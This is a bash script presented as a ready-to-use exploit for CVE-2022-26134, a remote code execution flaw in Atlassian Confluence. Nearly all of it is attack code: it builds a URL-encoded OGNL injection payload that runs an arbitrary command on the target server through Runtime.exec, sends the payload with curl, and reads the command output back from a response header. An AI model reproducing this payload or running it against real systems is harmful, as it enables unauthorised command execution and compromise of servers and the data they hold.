#!/bin/bash
# CVE-2022-26134 Confluence RCE Exploit
# Coded By: Tommy DeVoss <dawgyg@gmail.com>
#
# Usage:
# sh cve-2022-26134.sh https://example.com/ id
#
############################################################################

clear
echo "|--------------------------------------------|"
echo "|   CVE-2022-26134 Confluence RCE Exploit    |"
echo "|     Coded by: Tommy DeVoss aka dawgyg      |"
echo "|        Contact: dawgyg@gmail.com           |"
echo "|--------------------------------------------|"

if [[ $1 == "--help" ]]; then
	echo "-t / --target https://example.com/"
	echo ""
	echo "-c / --command command_to_run (Default Command: id)"
	echo ""
	echo "------------------------------------------------------------------------------------------------"
	echo "Usage: sh $0 https://example.com/ id"
	exit
fi

if [[ -z $1 ]]; then
	echo "Missing Target"
	exit
elif [[ -z $2 ]]; then
	echo "Missing Command. Defaulting to 'id'"
	command="id"
else
	url="$1"
	command="$2"
fi

echo "------------------------------------------------------------------------------------------------"
echo "Setting Up Exploit"
echo "------------------------------------------------------------------------------------------------"
encoded_command=`echo "$command" | sed 's/ /%20/g'`
payload="%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22$encoded_command%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22Cmd-Output%22%2C%23a%29%29%7D/"
target="$url$payload"
sleep 0.5
echo "Target: $url"
sleep 0.5
echo "Command: $command"
sleep 0.5
echo "Running Exploit..."
sleep 0.5
echo ""
echo "Sending HTTP Requst"
sleep 1
curl "$target" -o headers -I -s

echo ""
echo "------------------------------------------------------------------------------------------------"
echo "Checking Response for Command Output"
sleep 0.5
echo "Command Output: "
cat headers | grep "cmd-output:"
cat headers | grep "Cmd-Output:"
echo "------------------------------------------------------------------------------------------------"
rm -rf headers
